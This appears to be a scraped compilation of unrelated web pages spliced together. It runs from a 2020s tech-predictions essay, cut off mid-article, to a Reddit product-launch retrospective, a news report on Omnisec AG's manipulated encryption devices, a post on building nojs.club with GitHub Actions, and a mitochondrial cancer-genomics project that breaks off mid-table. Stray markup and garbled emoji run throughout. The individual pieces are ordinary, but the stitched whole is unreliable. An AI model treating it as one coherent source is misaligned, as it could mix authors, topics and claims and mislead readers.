<p><strong>This pattern of human-AI partnerships will be the defining technological advancement of the 2020s.</strong> Machines will help us <a href="https://www.nytimes.com/2020/11/24/science/artificial-intelligence-ai-gpt3.html">write code</a>, <a href="https://medium.com/@intelligent_pathways/business-process-automation-with-artificial-intelligence-4828356488b7">automate business processes</a>, <a href="https://aiartists.org/">create art</a>, <a href="https://medium.com/swlh/artificial-intelligence-to-reduce-medical-errors-d87bdb8e1ce5">reduce medical errors</a>, <a href="https://www.cio.com/article/3400877/artificial-intelligence-in-sports-a-smarter-path-to-victory.html">perform better in sports</a>, and much more. It’s going to take time for us to figure out how best to partner with our computer allies in these ventures, but I’m really excited to see what people come up with.</p>
<h3 id="no-code-and-low-code">“No-Code” and “Low-Code”</h3>
<p>Low-cost access to higher-level abstractions in the form of open-source frameworks, languages, and libraries have completely changed software development. Software developers are <a href="https://www.karllhughes.com/posts/plumbing">the plumbers of the 21st century</a>: it takes some skill to learn all the tools, but you don’t need to forge your own pipes to install a toilet.</p>
<p><a href="https://www.telerik.com/blogs/what-no-code-movement-means-for-software-developers">No-code is just the next higher-level abstraction for writing software</a>, and it’s going to allow <a href="https://www.zdnet.com/article/is-software-now-everybodys-job-the-implications-of-low-code-and-no-code-for-developers/">millions of “non-developers” to build custom software</a>. While it won’t supplant the need for specialized applications at large businesses, it will <a href="https://www.karllhughes.com/posts/creating-a-tech-startup-without-a-developer">remove the requirement for new startups and small businesses to have a technical founder</a>.</p>
<p>What’s more, no-code is being embedded in the next generation’s casual play:</p>
<blockquote>
<p>“Take the popularity of platforms like Roblox and Minecraft. Easily derided as just a generation’s obsession with gaming, both platforms teach kids how to build entire worlds using their devices. Even better, as kids push the frontiers of the toolsets offered by these games, they are inspired to build their own tools. There has been a proliferation of guides and online communities to teach kids how to build their own games and plugins for these platforms (Lua has never been so popular).” - <a href="https://techcrunch.com/2020/10/26/the-no-code-generation-is-arriving/">Danny Crichton, TechCrunch</a></p>
</blockquote>
<p>The 2020s will be the decade where kids raised playing Minecraft join the workforce. They’ll bring a casual acceptance that everyone can create custom business tools, and the millennials who think working knowledge of Excel is enough will get left in the dust.</p>
<h3 id="computing-on-the-edge">Computing on “the Edge”</h3>
<p>Over the past decade, as more devices have become “smart,” people have been trying to figure out what we could do with all these small internet-connected devices. The 2020s will be the decade where the first killer features hit this network of edge computing devices.</p>
<p>As a software developer, one of the most exciting advancements is the possibility of hosting more of our applications on the edge. Today, this means using specialized hosting services like <a href="https://fly.io/">Fly.io</a>, <a href="https://www.netlify.com/products/edge/">Netlify</a>, or <a href="https://workers.cloudflare.com/">CloudFlare</a> to serve APIs or web applications at globally distributed data centers. In the not-so-distant future, it might mean serving our applications from a peer-to-peer network that uses available compute power in nearby smart devices or phones.</p>
<p><img src="https://i.imgur.com/rlPTvJd.png" alt="Peer to peer hosting"></p>
<p>Even if peer-to-peer is unrealistic this decade, edge computing will continue to find new uses. For example, TinyML enables smart devices to share the computing responsibility for <a href="https://www.forbes.com/sites/janakirammsv/2020/11/03/how-tinyml-makes-artificial-intelligence-ubiquitous/">creating and processing machine learning models</a>. In the coming decade, your cell phone, computer, refrigerator, thermostat, and lights could be networked such that they “understand” your habits and alert you to unusual behaviors without sending this data to a central server.</p>
<p>The smart home is fun to think about as a consumer but probably not as important as smart manufacturing or smart resource extraction. The 2020s will bring a proliferation of companies like <a href="https://www.uptake.com/">Uptake</a> in a variety of industries which process and understand the myriad inputs coming in from networked devices around the worksite (or the world).</p>
<h2 id="business">Business</h2>
<blockquote>
<p>“Business opportunities are like buses; there’s always another one coming.” - Richard Branson.</p>
</blockquote>
<h3 id="default-to-remote-work">Default to Remote Work</h3>
<p>While many in-person events will come back after the Covid-19 pandemic is under control, companies were forced to rethink the requirement that all employees go into an office every day. Some of the world’s biggest companies <a href="https://www.flexjobs.com/blog/post/companies-switching-remote-work-long-term/">are extending remote options</a> and will likely downsize their office footprints in the coming decade. Startups that want to have the whole company together will likely move to hybrid models as well.</p>
<p>Remote work for white-collar office workers like programmers, accountants, and designers makes sense, but Covid-19 has pushed everyone to consider a default-remote future. Teachers have had to learn how to work remotely, convenience store workers are <a href="https://www.dailymail.co.uk/sciencetech/article-8748519/Robot-stocking-shelves-Japanese-convenience-store-lets-workers-maintain-social-distancing.html">controlling robots remotely in Japan</a>, and personal trainers are <a href="https://www.ecommercetimes.com/story/86898.html">adapting with virtual offerings</a>. Some of these in-person roles will return, and some will not.</p>
<p>As more workers get the option to work from home, this will affect other aspects of society as well. Why pay 3x per square foot in a city center if you don’t have to go to the office every day? Why buy a car if you only drive twice a week? If you want some sense of community, why not join a neighborhood coworking space instead of going to a downtown office?</p>
<p>Remote workers will re-evaluate these norms in the coming decade.</p>
<h3 id="automation-of-last-mile-transportation">Automation of Last Mile Transportation</h3>
<p>For years, we’ve heard about autonomous vehicles, but in the past year as <a href="https://azdot.gov/motor-vehicles/professional-services/autonomous-vehicles-testing-and-operating-state-arizona">a few pilot programs have taken to city streets</a> and <a href="https://www.ncsl.org/research/transportation/autonomous-vehicles-self-driving-vehicles-enacted-legislation.aspx">states have figured out how to legislate them</a>, it’s looking like the self-driving car will finally arrive this decade. One area that especially excites me about autonomous vehicles is <a href="https://www.sharedmobility.news/how-driverless-delivery-vehicles-are-solving-the-last-mile-delivery-problem/">last-mile delivery</a>.</p>
<p>Right now, getting packages and mail to the final recipient is expensive, especially in rural areas. If the trend toward remote work pushes middle-class professionals back into the suburbs and exurbs, there’s going to be an increased demand in fast shipping to these distant areas, so we’ll see Amazon and other carriers continue to invest in driverless technology.</p>
<p>With any luck, the US Post Office will actually <a href="https://www.npr.org/2019/05/21/725524334/u-s-postal-service-is-testing-self-driving-trucks">catch this trend and stay relevant</a>, but if not, I’d bet they’ll be shut down or reorganized this decade.</p>
<h3 id="smaller-full-time-staff-augmented-by-specialized-services">Smaller Full-Time Staff Augmented by Specialized Services</h3>
<p>Profit per employee <a href="https://www.mckinsey.com/business-functions/strategy-and-corporate-finance/our-insights/the-new-metrics-of-corporate-performance-profit-per-employee">has been steadily rising</a> in the past two decades. This trend will continue as companies build a narrowly focused core team around their primary value driver and use a combination of outsourcing, specialized service providers, and artificial intelligence to accomplish supporting functions.</p>
<p><img src="https://i.imgur.com/Iuod8I5.png" alt="Diagram of small core, satellite services"></p>
<p>A few trends are facilitating this ongoing shift.</p>
<p>First, as global communication breaks down barriers between commerce, companies that want to stand out have to focus on a narrow niche of specialization rather than be locationally focused. In the 2020s, it won’t make sense to try to be Chicago’s best digital agency. You’ll want to be the best digital agency for (insert specific industry) <em>in the world</em>. Networking and introductions will still matter, but connections can be made globally.</p>
<p>Another trend facilitating this change is the rise of the <a href="https://productizeandscale.com/what-is-productized-service/">productized service</a>. In this model, a service is packaged into a standard offering for a very specific customer and offered in a very specific way. The customer doesn’t get to go in and change the delivery mechanism or set all their own preferences because the service provider wants to capitalize on economies of scale by selling the service <em>the same way every time</em>.</p>
<p>I’ve already talked about AI, but this will be one of the biggest reasons companies will be able to run on a smaller core employee base. Even if large companies need departments for auxiliary functions like accounting, purchasing, and marketing, these teams will be smaller as they’ll rely on AI to get more done with fewer people.</p>

</blockquote>
<h3 id="k-12-school-stratification">K-12 School Stratification</h3>
<p>One of the trends I worry about most is the continued stratification of education in the 2020s. <a href="https://www.washingtonpost.com/news/answer-sheet/wp/2013/08/29/report-public-schools-more-segregated-now-than-40-years-ago/">Schools are more segregated today</a> than they were in the 1970s, and Covid-19 seems to have only accelerated this stratification of education.</p>
<p>Public schools have been struggling to offer a high-quality education to our top students while helping the millions of disadvantaged kids in our nation simply survive. Teachers are expected to do too much, but <a href="https://www.city-journal.org/html/how-teachers%E2%80%99-unions-handcuff-schools-12102.html">regressive unions</a> and <a href="https://www.aei.org/carpe-diem/chart-of-the-day-administrative-bloat-in-us-public-schools/">growing administrative costs</a> make it impossible for schools to financially incentivize good teachers to stay around.</p>

November 28, 2020 | https://mark.mcnally.je/blog/post/What%20I%20learnt%20from%20launching%20my%20new%20product%20on%20reddit | <a href="https://web.archive.org/web/*/https://mark.mcnally.je/blog/post/What%20I%20learnt%20from%20launching%20my%20new%20product%20on%20reddit">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    <p>I Launched my new website <a href="https://youtubetopodcast.com/">https://youtubetopodcast.com</a> only using Reddit. I did not
use the normal routes of Product hunt, hacker news and all that jazz. I did not
think this product was "worthy" of those platforms. In fact calling it
a product is wrong, it's more of a tool. Not designed to make money (besides
donations ;)) and more to actually be something that is occasionally useful to people.</p>
<p>But anyway, onto the results of my very small launch.</p>
<h2>The results</h2>
<p>If you just want to know the outcome of the launch here are the stats</p>
<ul>
<li>ðŸ‘� 1300 People viewed my website</li>
<li>ðŸ“ˆ 50 people, or 3.8% of people registered with my website</li>
</ul>
<p>Those stats might not seem very impressive, but to me, with the very small
amount of launching I did, I think that they are pretty good.</p>
<p>Read on to find out what I learnt from this launch, how you can do it and what
I would do differently.</p>
<h2>What Subreddits?</h2>
<p>You can't just post onto Reddit, you have to post into a sub community,
a Subreddit</p>
<p>Picking the correct ones is very important.</p>
<h3>Technology Subreddits</h3>
<p>I launched on Subreddits to do with the technology I was using and the
Subreddits where I thought people would get the most use out of the "tool". </p>
<p>I wanted to launch on more Subreddits. However Subreddit rules can be very
strict around self promotion. Most of Reddit is against self promotion unless
that's the main purpose of the Subreddit.</p>
<p>The technology for my website is Django, so I launched on 2 subs that I frequent
often:</p>
<ul>
<li><a href="https://www.reddit.com/r/django/comments/jqfx30/using_django_i_made_a_website_that_lets_you/">r/django</a></li>
<li><a href="https://www.reddit.com/r/djangolearning/comments/jqi0zq/i_made_a_website_in_django_that_lets_you_convert/">r/djangolearning</a></li>
</ul>
<p>I recommend launching on Subreddits that are related to your technology,
especially if you can help people in the comments. I know I appreciate it when
someone builds something using a technology that I use. It almost motivates people
on those Subreddits and shows what they can build. These Subreddits are also
relatively small so I can easily reply to every comment and my site would
hopefully not get "hugged to death".</p>
<p>I did not launch on the r/python and r/learnpython. I felt like it would not be
relevant to most people making python programs. Although in retrospect I would
probably do this.</p>
<p>Takeaway here is to launch on Subreddits relating to the technology that you
used to make the product. People on those Subreddits are interested in what they can make with the tech!</p>
<h3>Subreddits relating to the use of the tool</h3>
<p>I also launched on Subreddits for people who I think would most want to use the
tool. The users of this tool are people who already listen to podcasts
and watch Youtube videos. This is probably most people on Reddit. So
I narrowed it down further to; "what <em>I</em> specifically will use it for". This
helped, I use it to download lectures so I can listen to them offline. So
educational Subreddits and studying Subreddits. I posted on the following
Subreddits:</p>
<ul>
<li><a href="https://www.reddit.com/r/productivity/comments/jqfzzp/i_made_a_website_that_lets_you_convert_youtube/">r/productivity</a></li>
<li>r/frugallearning </li>
<li>r/GetStudying</li>
<li>r/Studytips</li>
</ul>
<p>The only Subreddit that garnered a response was r/productivity, in fact that
seems to be where I got the most response, turns out if you have a tool that
can improve productivity people on a productivity Subreddit will like it! I also custom tailored my
headline for this post:</p>
<blockquote>
<p><em>I made a website that lets you convert Youtube videos into podcasts, I use it to listen to lectures in the car so I can at least feel like I am being productive when driving!</em></p>
</blockquote>
<p>That's a useful and truthful statement, no lies or clickbait titles. It's what
people want to see and click on.</p>
<p>Be helpful, find a way to describe how your application is useful to the people
who will see your post. This is why I think posting on the general Subreddits
failed, what I said was not specific enough. I basically said what the tool did
and not a use case. I also used the term "completely free" for example on
r/studytips I posted:</p>
<blockquote>
<p><em>I made a completely free website that lets you convert youtube videos to podcasts. I find it useful to listen to lectures offline or when I am not at my computer :)</em></p>
</blockquote>
<p>I feel like the words "completely free" put people off, in retrospect it sounds
a bit clickbaity and also shady in a way, like I am going to steal your data or
the website is going to be plastered with ads kind of shady. I would not want
to click on that! </p>
<p>The r/productivity post was very successful, almost too successful. The
r/productivity Subreddit actually has a rule against promoting things as people
where being to spammy however I, and the productivity Subreddit community seemed to agree that my post was
relevant. I got a huge response from it before it was removed. I never did get
told why it was removed but I assume some moderator thought that even though my
website was very useful in boosting productivity it was against the rules.
Which I can't really argue with (as it was (I should have checked before posting)).</p>
<p>Here is a screenshot of the post.</p>
<p><img alt="Screenshot of my productivity subreddit post" src="https://mark.mcnally.je/media/pagedown-uploads/reddit_productivity_post.png"></p>
<p>60 comments, 22 of those are by me. Thanking people, answering questions and
fixing bugs. It's very important to do this, go the extra mile for people using
your website, they are more likely to stick around. </p>
<p>In heindsight I should have posted to more educational Subreddits, perhaps
I will at a later date once some my site is a bit more up to date with features
and feedback. It is also useful to do a small product launch to see how your product
works with actual people using it.</p>
<h2>Subreddit Discovery</h2>
<p>To discover Subreddits, go to a Subreddit where you know it's audience will
like what you post - even if you are not "allowed" to post there. Reddit has
a "related subreddits" option that might give you a place where you can
actually post your product. Have a look at there sidebars, often there is
a helpful list of other Subreddits that are related to the sub you are
currently on.</p>
<p>For example, r/studying led me to r/studytips and all the other study related ones. 
This would be useful in my quest to find educational Subreddits, r/history is
likely to have a "learn history" Subreddit linked in the side bar. This is the
place where my tool would be useful.</p>
<h2>Spam</h2>
<p>Make sure to only post on Subreddits where you think your tool could truly be
helpful to people. Go in with the best intentions for the people, not as
a marketing person. Be honest and true, don't lie or write clikbait titles.
<em>Post something that you would click on</em>. </p>
<p>I did not apply this to all my posts, I learnt from this. You don't want to be
internet spam, that's pretty low and will likely tarnish your reputation (or,
well Reddit account)</p>
<h2>Results</h2>
<p>So, how successful was this launch?</p>
<p>A week after posting, just over 1300 people have viewed my website.</p>
<p>Of those 1300, 50 people signed up to my website. Keep in
mind that you don't have to sign up to use the application<sup id="fnref:1"><a href="#fn:1">1</a></sup>. 50 people is
not much, but for a very small product launch it was more then I was expecting.
If I had launched on more Subreddits this number would be significantly higher.</p>
<p>I am not sure if this is a good value, 3.8% of people who visited my website
signed up. To me that seems good! So, I guess that means it's good!</p>
<p>Some other stats that might be interesting:</p>
<ul>
<li>~90 people viewed my personal website</li>
<li>~49 people viewed the donate page<ul>
<li>No one  donated, at the time there was no incentive for people to donate
  (although there is now ;)</li>
</ul>
</li>
</ul>
<h2>Interesting Titbits</h2>
<p>70% of viewers were mobile based, Thankfully <a href="https://youtubetopodcast.com/">https://youtubetopodcast.com</a> looks <em>ok</em> on mobile; well it also looks <em>ok</em> on desktop, not great, not terrible.</p>
<p>I started to get spam emails from companies trying to sell me massive datasets
of peoples data. I have not received this kind of spam before so I guess I did
something right to even get on the radar of these companies.</p>
<p>The website got featured on a <a href="https://poddtoppen.se/podcast/840995196/yeswas-podcast/346-podcast-lockdownowy">polish
podcast</a> I don't understand polish but at 24mins in they say "youtubetopodcast.com" which was kinda surreal to hear someone actually talking about something I made. Even if I did not understand it.</p>
<p>"<a href="https://youtubetopodcast.com/">https://youtubetopodcast.com</a> is on page 2 of google when you search
"convert youtube videos to podcasts" ideally I would like it to be number 1,
but I have not done any SEO at all. </p>
<h2>Learnings</h2>
<p>Patch things fast! Listen and reply to everyone, especially if you are just
doing a small launch like I did. You can reply to everyone and if people see
you fixing bugs for people in the comments you will get a lot of respect.</p>
<p>I did not have a link for people to sign up to my mailing list to get updates
from me. I reckon a fair amount of people would have done that.</p>
<p>My blog did not have much content on it, the home page especially was pretty
boring. I should have had more content so those people who did visit my
blog actually got some benefit out of it.</p>
<p>I was worried that the server I was going to use was not going to be powerful
enough, in fact it was! Although it was limited by CPU cores. If you wanted to
know the server is a cheap VPS from OVH, nothing fancy. You don't need anything
fancy if you are just doing a small launch.</p>
<p>I Should have put my twitter link on <a href="https://youtubetopodcast.com/">https://youtubetopodcast.com</a> especially
because I was posting some updates about the application on there.</p>
<p>Next time I do something like this I will also post on more Subreddits.
Although maybe limiting this as a "test" launch is a good idea?</p>
<h2>Key takeaways</h2>
<ul>
<li>
<p>Post on relevant Subreddits</p>
<ul>
<li>Find relevant Subreddits by looking at the sidebar of bigger Subbreddits</li>
</ul>
</li>
<li>
<p>Don't post spammy, clickbaity or anything that might come of as "shady"</p>
</li>
<li>
<p>Make sure you have links to your personal website and your socials and give
  insensitive for people to click on them - "follow me on twitter for updates"</p>
</li>
<li>
<p>Give people an incentive to give you money. However I don't think launching
  necessarily needs to be monetised, I feel like if I had spent a couple
hours writing some basic premium features some people might have paid for
them.</p>
</li>
</ul>
<h2>Conclude</h2>
<p>I will relaunch my website on Reddit again, this time I will be better and
follow the advice that I have layed out in this post. At the time I did not
know this stuff but now I do (hopefully you have learnt something as well). </p>
<p>Admittedly I did get quite lucky with the r/productivity response and this is
not the …</p></div></div>

</div><p>Swiss public television, SRF, has found a second company besides Crypto AG&nbsp;was involved in manufacturing manipulated devices allegedly used for spying by foreign intelligence.</p>

<time datetime="2020-11-26T11:34:28+01:00">

</time><p>According to <a rel="noopener" target="_blank" href="https://www.srf.ch/news/schweiz/verschluesselungsgeraete-geheimdienstaffaere-weitere-schweizer-firma-rueckt-in-den-fokus">SRF sources</a>, the Swiss company Omnisec AG had ties to US intelligence services. This follows revelations in February by SRF, German television ZDF and <em>The Washington Post</em> that Zug-based firm Crypto AG was at the heart of a huge international spying operation led by the CIA, and to a lesser extent by the German BND spy agency.&nbsp;Omnisec was one of the largest competitors of Crypto AG.</p><p>Swiss cryptologist and professor Ueli Maurer was a consultant for Omnisec for years and told SRF that in 1989 US intelligence services (National Security Agency) contacted Omnisec through him.</p><p>Of concern are the OC-500 series devices. Devices were sold to several Swiss federal agencies. However, Swiss&nbsp;authorities only noticed the devices weren't secure&nbsp;in the mid-2000s.</p><p>Several Swiss companies also received manipulated devices from Omnisec, including Switzerland’s largest bank, UBS. It is unclear whether the authorities informed UBS about the weak devices in the mid-2000s. UBS told SRF that it does not comment on security matters but that it had no indications that sensitive data were exposed at the time.</p>
<p>Omnisec, founded in 1987, manufactured voice, fax and data encryption equipment. It was dissolved a few years ago. The most recent head of the company, Clemens Kammer, told SRF that Omnisec customers “have and will continue to place great value on security, confidentiality, discretion and reliability in business relationships”.</p><p>Some politicians have called for further investigations into these latest allegations that may reveal who, if anyone, in the federal government knew of Omnisec’s business affairs with foreign intelligence.</p><h2>Crypto affair</h2><p>Earlier this month, a nine-month&nbsp;<a rel="noopener" target="_blank" href="https://web.archive.org/web/20201110183555/https:/www.parlament.ch/press-releases/Pages/mm-gpdel-2020-11-10.aspx">investigation</a>&nbsp;by the Swiss parliamentary audit committee (GPDel), found that the Swiss intelligence service knew that the US Central Intelligence Agency was behind the Swiss-based Crypto AG as far back as 1993. The report says that Swiss intelligence later collaborated with them to gather information from foreign sources.&nbsp;</p><p>More than 100 countries bought encryption devices from the Zug-based company, which did business under the guise of Swiss neutrality. In reality, the firm belonged to the CIA and Germany intelligence service, which could freely read what it encrypted. Information intercepted with the help of Crypto’s devices changed the course of events, including the Iran hostage crisis of 1979.</p> </section>

November 28, 2020 | https://goel.io/nojs-club | <a href="https://web.archive.org/web/*/https://goel.io/nojs-club">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Modern web is a mess. That’s why I think I loved the idea behind <a href="https://1mb.club/">1MB Club</a>, and the offshoots <a href="https://512kb.club/">512KB Club</a> and <a href="https://250kb.club/">250kb Club</a>. They are lists of websites where the pages are under 1MB, 512KB, and 256kb respectively.</p>

<p>Taking inspiration from them, I am launching <a href="https://nojs.club/">The NoJS Club</a>. As the name suggests, it’s a showcase of the Javascript-less web. While we can debate the merits of Javascript endlessly, without changing anyone’s mind, I’d like to highlight how I built the nojs.club website itself.</p>

<p>I had two main goals with this project. First, adding a new website should not require someone to go through the cumbersome process of forking the repo and sending a pull request. Second, ongoing maintenance of the website should be reduced as much as possible.</p>

<p>As you can guess, there’s an <a href="https://xkcd.com/1319/">xkcd</a> for that:</p>

<p><img src="https://i.imgur.com/aOzKm7u.png" alt=""></p>

<p>While I don’t expect the project to go viral, it was a fun learning opportunity. I decided to fully operationalize it through Github: Github Actions for adding new websites to the list, and Github Pages for hosting the resulting webpage.</p>

<p>If you are not familiar with Github Actions, this is a good intro from <a href="https://docs.github.com/en/free-pro-team@latest/actions/learn-github-actions/introduction-to-github-actions">Github docs</a>:</p>

<blockquote>
  <p>GitHub Actions help you automate tasks within your software development life cycle. GitHub Actions are event-driven, meaning that you can run a series of commands after a specified event has occurred. For example, every time someone creates a pull request for a repository, you can automatically run a command that executes a software testing script.</p>
</blockquote>

<p>The full flow in nojs.club is like this:</p>

<ol>
  <li>
    <p>Someone <a href="https://github.com/karan/nojs.club/issues/new?assignees=&amp;labels=&amp;template=nojsrequest.md&amp;title=example.com">opens an issue</a> suggesting a new website. The issue must follow the set template.</p>
  </li>
  <li>
    <p>A Github Actions Workflow kicks off and</p>

    <p>a. Extracts the domain of the request (<a href="https://github.com/karan/nojs.club/blob/19a5556c278e55a74572c7a0ab9bc524725f6e58/.github/workflows/main.yml#L32-L37">code ref</a>)</p>

    <p>b. Find any use of <code>&lt;script&gt;</code> tags on the web page. Good ol’ <code>curl</code> and <code>grep</code> come in handy here (<a href="https://github.com/karan/nojs.club/blob/19a5556c278e55a74572c7a0ab9bc524725f6e58/.github/workflows/main.yml#L39-L64">code ref</a>)</p>

    <p>c. Post a comment on the issue with any Javascript found (<a href="https://github.com/karan/nojs.club/blob/19a5556c278e55a74572c7a0ab9bc524725f6e58/.github/workflows/main.yml#L66-L72">code ref</a>)</p>
  </li>
</ol>

<p>Once that happens, someone (me) must manually approve the request. I must post a comment in the format <code>/approve example.com 123.45</code> where the numbers refer to the total size of downloaded assets in KB. Another workflow then kicks off and adds the domain to a CSV file in the same repo (<a href="https://github.com/karan/nojs.club/blob/19a5556c278e55a74572c7a0ab9bc524725f6e58/.github/workflows/main.yml#L80-L111">code ref</a>).</p>

<p><img src="https://i.imgur.com/UONdXnW.png" alt=""></p>

<p><em>Note: While I can also automate the approval itself, I did not want to risk adding bad data to the list.</em></p>

<p>Excluding the latency for me to respond, this takes under a minute.</p>

<p>When a new commit is pushed to the repo, a <a href="https://github.com/karan/nojs.club/blob/main/.github/workflows/github-pages.yml">different workflow</a> builds and pushes the Jekyll-based site to the <code>gh-pages</code> branch. That process takes a couple of minutes.</p>

<h2 id="some-gotchas">Some gotchas</h2>

<p>While the resulting process and code is relatively easy to follow and reason about, it did take a lot of head-banging for me to get it working end-to-end.</p>

<h4 id="fail-fast-shell">Fail-fast shell</h4>

<p>The default shell that Github provides fails fast: <code>-eo pipefail</code>. What that means is that any command with a non-zero exit code will fail the job.</p>

<p>Little did I know that <code>grep</code> by default returns an exit code of <code>1</code> when no match is found:</p>

<div><div><pre><code>$ echo "hello world" | grep hi
$ echo $?
1
</code></pre></div></div>

<p>The bash script in a fail-fast shell, thus, ends up failing with an exit code of <code>1</code>, and <a href="https://github.com/karan/nojs.club/runs/1456173513?check_suite_focus=true">no useful logs</a>.</p>

<h4 id="no-local-dev-environment">No local dev environment</h4>

<p>The lack of a full-fledged local dev environment for Github Actions meant that my development flow was slow and unpredictable. I would modify the action, push it, then test using real issues. This results in so much time being spent just waiting to test.</p>

<p>I would urge Github to put out a real test environment that stubs events.</p>

<h4 id="jekyll-versioning">Jekyll versioning</h4>

<p>The website is built using Jekyll like I mentioned. Because I wanted the list of websites to be sorted by size of the web page, I had to do an in-memory sort (<a href="https://github.com/karan/nojs.club/blame/19a5556c278e55a74572c7a0ab9bc524725f6e58/index.md#L28">code ref</a>). That worked well locally, but not when rendered by Github Pages.</p>

<p><img src="https://i.imgur.com/e9LOuEU.png" alt=""></p>

<p>After some digging, I found that Github uses Jekyll 3.9.0 while my local install had 4.0.1. That seemed like a likely culprit, and as I found was <a href="https://github.com/github/pages-gem/issues/651">widely reported</a>. Github has shown no interest in upgrading Jekyll, so the workaround for me was to build the Jekyll site on every commit using - you guessed it - Github Action (<a href="https://github.com/karan/nojs.club/blob/19a5556c278e55a74572c7a0ab9bc524725f6e58/.github/workflows/github-pages.yml#L13">code ref</a>).</p>

<h4 id="trigger-action-on-commit">Trigger action on commit</h4>

<p>When a commit is made through a Github Action, by default the resulting action does not trigger any Github Action Workflows. As <a href="https://help.github.com/en/actions/reference/events-that-trigger-workflows#triggering-new-workflows-using-a-personal-access-token">Github explains</a>:</p>

<blockquote>
  <p>When you use the repository’s GITHUB_TOKEN to perform tasks on behalf of the GitHub Actions app, events triggered by the GITHUB_TOKEN will not create a new workflow run. This prevents you from accidentally creating recursive workflow runs.</p>
</blockquote>

<p>This is a good default. However, this means that when my Github Action adds a new website to the CSV, it does not trigger a Jekyll build. A simple solution for this is to use a personal access token instead of the <code>GITHUB_TOKEN</code> (<a href="https://github.com/karan/nojs.club/blob/19a5556c278e55a74572c7a0ab9bc524725f6e58/.github/workflows/main.yml#L85">code ref</a>).</p>

<h2 id="conclusion">Conclusion</h2>

<p>There are of course many ways to implement a similar project, some better than others. In the end, this was a good project to learn some new skills, build something that aligns with <a href="https://goel.io/about#principles">my principles</a>, and join a <del>viral trend</del> fad.</p>

<p>Now go remove all Javascript from your website and <a href="https://github.com/karan/nojs.club/issues/new?assignees=&amp;labels=&amp;template=nojsrequest.md&amp;title=example.com">add it to the list</a>.</p>

<h2>Introduction</h2>

<p><strong>Summary:</strong> Metabolic reprogramming and cell death evasion are hallmarks of many cancers, implicating the mitochondria in carcinogenesis. Study of mutations to the mitochondria’s miniature circular genome have identified cancer-specific mutation patterns that may be relevant to cancer initiation/progression.</p>
<p><br> Mitochondria are the power generators of the cell, wherein a system of proteins embedded in the inner membrane generate the universal energy currency of the cell, ATP. In addition to their canonical role in cell metabolism, they are involved in other myriad processes in inflammation and apoptosis (programmed cell death). Cancer cells are characterized by high energy requirements, unchecked proliferation, and avoidance of cell death controls, so mitochondria are hypothesized to play a central role in the genesis and progression of cancer (<span>Hertweck and DesDasgupta (2017)</span>; <span>Brandon, Baldi, and Wallace (2006)</span>; <span>Zong, Rabinowitz, and White (2016)</span>; <span>Hanahan and Weinberg (2011)</span>).</p>
<p>The mitchondrion is believed to have originated from a bacteria, engulfed by a pre-eukaryotic cell around 1 billion years ago. The mitochondrion possesses it’s own small genome, about 16.6 kb long, encoding 13 proteins that form the cellular respiration machinery of the organelle. The genome also encodes 22 transfer RNAs and 2 ribosomal RNAs (<span>Hertweck and DesDasgupta (2017)</span>). Mutations to the mitochondrial genome have been associated with many cancer types, although the mechanism of action of many of these mutations is unclear.</p>
<p>In the nuclear genome, there is remarkable heterogeneity in common and rare variants between genes and across cancer types. Greater than 90% of mutations in The Cancer Genome Atlas (TCGA) are singletons, meaning they appear once across the TCGA sequenced tumors. Previous research used a non-parametric Bayesian methods developed in the fields of ecology and computational linguistics to mine cancer-specific signals from the ‘hidden genome’ of previously unseen mutations (<span>Chakraborty et al. (2019)</span>). This research represented an novel way of examining mutation in human cancer by focusing on the mutations that have yet to be documented.</p>
<p>High depth, multi-sample molecular characterizations of the mitochondrial genome have illustrated a number of parallels between mtDNA and nuclear DNA in relation to their mutational landscapes (<span>Yuan et al. (2020)</span>). Mutational hotspots (which have been well documented in the nuclear genome) were observed in the regulatory D loop and the <em>ND4</em> gene. <em>ND5</em> was the most frequently mutated gene, <em>ND4</em> was most frequently mutated in prostate and lung cancers, and <em>COX1</em> was most frequently mutated in breast, cervical, and bladder cancers. Yuan et al.&nbsp;identified that truncating mutations were enriched in kidney, colorectal, and thyroid cancers, while copy number variants showed remarkable heterogeneity between cancers. In summary, like the nuclear genome, the mitochondrial genome contains an exotic and rich diversity of mutations between genes and between cancer types.</p>
<p>This project aims to surveill the landscape of single nucleotide variants in the cancer mitochondrial genome, with a special emphasis on applying bayesian nonparametric methods to estimate previously unseen variant signals in the mitochondrial genome. 5% of global cancer diagnoses are of unknown tissue of origin and are associated with poor health outcomes; a systematic, data-driven dive into uncovering the mutational hallmarks of different cancers in the mitochondrial genome could help improve or sophisticate attempts at classifying cancers based on a cancer’s mutation profile.</p>

<div id="the-data">
<h2>The Data</h2>

<p><strong>Summary:</strong> We analyzed SNV data from 2177 tumor samples spanning 22 tissues from The Cancer Mitochondria Atlas. We used a table scraped from MitoMap to map variants to particular genomic features</p>



<p>There has been limited research on the frequencies of rare variation within the mitochondrial genome across several tissue types. Yuan et al.&nbsp;created The Cancer Mitochondria Atlas (TCMA), an open-access web portal to support research and education surrounding mitochondrial cancer genetics. The portal contains open source somatic variant, copy number, nuclear transfer data, and a coexpression dataset. This project will restrict its focus to analysis of somatic variant mutations.</p>
<p>The TCMA somatic variant data data contains 7611 instances of somatic variant mutations across 2177 tumor samples spanning 36 primary sites and histologies. The data includes the ‘sample_id’, which corresponds to the unique identifier for each patient/tumor sample. The ‘cancer_type’ column denotes the tissue of origin and histology of each cancer. The ‘chrom’ column is ‘MT’ indicating all data comes form the mitochondrial genome. ‘position’ denotes the locus of mutation along the 16.6 kb mitochondrial genome. ‘ref’ and ‘var’ denote what the unmutated reference nucleotide is and what the mutated variant nucleotide idenity is. ‘var_type’ denoets the kind of mutation: noncoding, synonymous, nonsynonymous, etc. We generated a few additional variables, chiefly ‘SBS’, which denotes the direction of nucleotide change and ‘n_tumor’, which denotes the number of tumors of that particular cancer_type in the dataset.</p>

<h2>Methods</h2>

<p><strong>Summary:</strong> We propose using nonparametric statistical methods developed in the fields of computational linguistics and statistical ecology to mutations in the mitochondrial genome. These methods estimate quantitaties and probabilities of hitherto unseen variants.</p>

Alexander Corbet’s study of the richness of Malayan butterfly species sparked the development of statistical methods to solve the ’Unseen Species Problem.
</p>
</div>

<p>In the early 1940’s, naturalist Alexander Corbet spent two years in Malaya trapping butterflies. At the end of his time in Malaya, Corbet constructed a table of species frequencies, denoting how many species he captured once, twice, etc.</p>
<table>
<thead>

